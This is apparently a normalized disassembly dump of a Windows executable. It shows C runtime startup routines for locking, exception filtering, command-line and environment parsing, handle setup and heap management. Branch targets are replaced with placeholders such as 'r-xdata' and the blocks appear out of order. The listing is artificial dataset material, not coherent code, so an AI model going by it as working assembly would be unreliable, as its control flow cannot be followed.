jmp sub_4135fa
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_4136da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_410b8c
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_4136da
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_41098a
pop ecx
call sub_410cc6
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_41373b
pop ecx
pop edi
sub_413750
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4137d4
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_410472
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_410430
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_410472
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_410506
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_4138b4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_4168a8
add esp 0x1c
test eax eax
jne r-xdata
sub_413930
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_413964
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_413593
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_413aa2
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_413aa2
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_413adc
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_412364
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_417677
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_413b34
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_412364
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_410b8c
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_41098a
pop ecx
push esi
call sub_411a10
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_410cc6
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_410b8c
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_411a10
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_415bf0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_41098a
pop ecx
sub_413bed
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_412364
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_413c86
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_410b8c
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_413c86
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_41098a
pop ecx
sub_413c86
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_413e3a
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_410b8c
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_410b8c
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_410ff0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_410cc6
pop ecx
mov [ esp + 0x10 ] ebx
sub_413f6c
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_410b8c
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_41098a
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_410b8c
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_414128
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_414155
push ebp
mov ebp esp
mov eax 0x122c
call sub_411530
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_414128
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_416870
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_415e20
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_415870
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_410daf
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_41429d
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_414155
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_414505
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_41504c
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_4142fa
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_414333
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_414333
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_414333
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_411a10
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_411a10
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_415bf0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_415bf0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_415c00
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_415c00
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_415c00
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_4176b9
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_411a10
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_417750
add esp 0x10
sub_414486
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_417648
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_4135fa
pop esi
retn 0x4
sub_4144ea
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_414505
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_41454d
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_414578
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
